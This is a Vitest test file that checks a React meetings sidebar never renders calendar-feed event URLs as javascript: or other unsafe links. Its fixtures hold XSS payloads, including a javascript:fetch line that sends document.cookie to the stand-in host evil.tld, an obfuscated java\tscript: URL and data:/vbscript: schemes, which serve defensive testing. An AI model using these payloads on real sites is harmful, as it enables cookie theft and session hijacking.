import { describe, expect, it, vi } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

/**
 * B53 — the meetings sidebar renders an event's `url` as an anchor `href`.
 * The value comes from a subscribed calendar feed, so it is untrusted: a
 * `javascript:` URL would execute in the app's own origin when the user
 * clicks the event title.
 *
 * Two layers defend the anchor:
 *   1. the parser (`src/lib/ics.ts`) drops a hostile `URL:` property before
 *      it is ever stored — pinned in `src/lib/ics.test.ts`;
 *   2. the render site here re-checks every value that reaches the DOM, so a
 *      row that is already in the database (stored before the parser was
 *      fixed, or written by another path) can never become a `javascript:`
 *      link.
 *
 * The component is a client shell over the calendar Server Actions,
 * `next/navigation`, `next/link` and `sonner`; all four are stubbed here
 * (there is no Next runtime in the node test environment).
 */

vi.mock("next/navigation", () => ({
  useRouter: () => ({ push: vi.fn(), refresh: vi.fn(), replace: vi.fn() }),
}));
vi.mock("next/link", async () => {
  const { createElement: h } = await import("react");
  return {
    default: ({
      href,
      children,
      className,
    }: {
      href: string;
      children?: unknown;
      className?: string;
    }) => h("a", { href, className }, children as never),
  };
});
vi.mock("sonner", () => ({ toast: { success: vi.fn(), error: vi.fn() } }));
vi.mock("@/server/actions/calendar", () => ({
  connectCalendarFeedAction: vi.fn(),
  createMeetingNoteAction: vi.fn(),
  disconnectCalendarFeedAction: vi.fn(),
  refreshCalendarFeedsAction: vi.fn(),
}));

const { SidebarMeetings } = await import("./sidebar-meetings");
type MeetingEventView = import("./sidebar-meetings").MeetingEventView;

const h = createElement;

const event = (over: Partial<MeetingEventView> = {}): MeetingEventView => ({
  id: "e1",
  title: "Quarterly review",
  start: new Date("2026-01-15T09:00:00Z"),
  end: null,
  allDay: false,
  location: null,
  url: null,
  notesPageId: null,
  feed: null,
  ...over,
});

const render = (events: MeetingEventView[]) =>
  renderToStaticMarkup(
    h(SidebarMeetings, {
      workspaceId: "w1",
      slug: "acme",
      events,
      feeds: [],
      locale: "en",
    }),
  );

describe("SidebarMeetings — event link", () => {
  it("renders an https URL as a link", () => {
    const html = render([event({ url: "https://example.com/meet" })]);
    expect(html).toContain('href="https://example.com/meet"');
    expect(html).toContain("Quarterly review");
  });

  it("never renders a javascript: URL as an href", () => {
    const html = render([
      event({ url: "javascript:alert(1)", title: "Quarterly review" }),
    ]);
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<a ");
    // The title is still shown — as plain text, without a link.
    expect(html).toContain("Quarterly review");
  });

  it("drops a javascript: URL that is already in the database", () => {
    const html = render([
      event({
        url: "javascript:fetch('https://evil.tld/?c='+document.cookie)",
        title: "Quarterly review",
      }),
    ]);
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("<a ");
  });

  it("drops an obfuscated javascript: URL", () => {
    const html = render([event({ url: "java\tscript:alert(1)" })]);
    expect(html).not.toContain("script:alert(1)");
    expect(html).not.toContain("<a ");
  });

  it("drops every other scheme", () => {
    for (const url of [
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "ftp://example.com/meet",
      "//evil.tld/meet",
    ]) {
      const html = render([event({ url })]);
      expect(html).not.toContain("<a ");
      expect(html).not.toContain(url);
    }
  });

  it("renders the title as plain text when the event has no URL", () => {
    const html = render([event({ url: null })]);
    expect(html).not.toContain("<a ");
    expect(html).toContain("Quarterly review");
  });

  it("never turns a hostile feed URL into an href (feed → parser → sidebar)", async () => {
    const { parseIcsEvents } = await import("@/lib/ics");
    const feed = [
      "BEGIN:VCALENDAR",
      "BEGIN:VEVENT",
      "UID:evt-1@noema",
      "SUMMARY:Quarterly review",
      "URL:javascript:fetch('https://evil.tld/?c='+document.cookie)",
      "DTSTART:20260115T090000Z",
      "END:VEVENT",
      "END:VCALENDAR",
    ].join("\r\n");

    // The parser drops the hostile value, so it is never stored ...
    const [parsed] = parseIcsEvents(feed);
    expect(parsed.url).toBeNull();

    // ... and the sidebar links nothing, whatever the row holds.
    const html = render([
      event({ url: parsed.url, title: parsed.title, start: parsed.start }),
    ]);
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<a ");
    expect(html).toContain("Quarterly review");
  });
});
